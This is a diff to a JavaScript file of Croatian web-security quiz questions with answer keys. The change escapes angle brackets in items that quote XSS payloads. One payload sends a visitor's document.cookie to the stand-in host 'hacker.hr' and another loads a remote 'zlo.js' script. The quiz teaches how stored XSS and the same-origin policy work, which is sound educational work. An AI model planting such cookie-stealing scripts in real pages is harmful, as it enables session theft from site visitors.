@@ -776,14 +776,14 @@ const ALL_QUESTIONS = [
   // ── WEB SIGURNOST ───────────────────────────────────────────────────────────
   {
     topic: "Web sigurnost",
-    q: "Na forum je postavljena poruka: <script>document.location.href='http://hacker.hr/cookie=?'+document.cookie</script>. Kakav je to napad?",
+    q: "Na forum je postavljena poruka: \x3Cscript\x3Edocument.location.href='http://hacker.hr/cookie=?'+document.cookie\x3C/script\x3E. Kakav je to napad?",
     answers: ["Reflektirani XSS", "Slijepi SQL injection", "Pohranjeni (Stored) XSS", "CSRF"],
     correct: 2,
     explanation: "Pohranjeni XSS: skripta je pohranjena na poslužitelju (forumu) i izvršava se u pregledniku svakog posjetitelja koji učita stranicu. Reflektirani XSS bi se izvršavao samo kroz URL."
   },
   {
     topic: "Web sigurnost",
-    q: "Stjepan je postavio <script src='http://stjepan.hr/zlo.js'></script> na forum. Što se događa kada Marin učita stranicu?",
+    q: "Stjepan je postavio \x3Cscript src='http://stjepan.hr/zlo.js'\x3E\x3C/script\x3E na forum. Što se događa kada Marin učita stranicu?",
     answers: [
       "Skripta se ne preuzima jer SOP to sprečava",
       "Skripta se preuzima ali ne izvršava",
@@ -791,7 +791,7 @@ const ALL_QUESTIONS = [
       "Preglednik prikaže sigurnosno upozorenje i blokira učitavanje"
     ],
     correct: 2,
-    explanation: "Same Origin Policy (SOP) sprečava ČITANJE podataka s druge domene, ali ne blokira UČITAVANJE skripti. Tag <script src='...'> može učitati skriptu s bilo koje domene i ona se izvršava u kontekstu foruma."
+    explanation: "Same Origin Policy (SOP) sprečava ČITANJE podataka s druge domene, ali ne blokira UČITAVANJE skripti. Tag \x3Cscript src='...'\x3E može učitati skriptu s bilo koje domene i ona se izvršava u kontekstu foruma."
   },
   {
     topic: "Web sigurnost",
@@ -809,7 +809,7 @@ const ALL_QUESTIONS = [
     topic: "Web sigurnost",
     q: "Koji od navedenih načina SPREČAVA SQL injection napade?",
     answers: [
-      "Filtriranje HTML tagova (<script>, <img>...)",
+      "Filtriranje HTML tagova (\x3Cscript\x3E, \x3Cimg\x3E...)",
       "Korištenje HTTPS protokola",
       "Korištenje pripremljenih izjava (prepared statements)",
       "Postavljanje kolačića s HTTPOnly zastavicom"
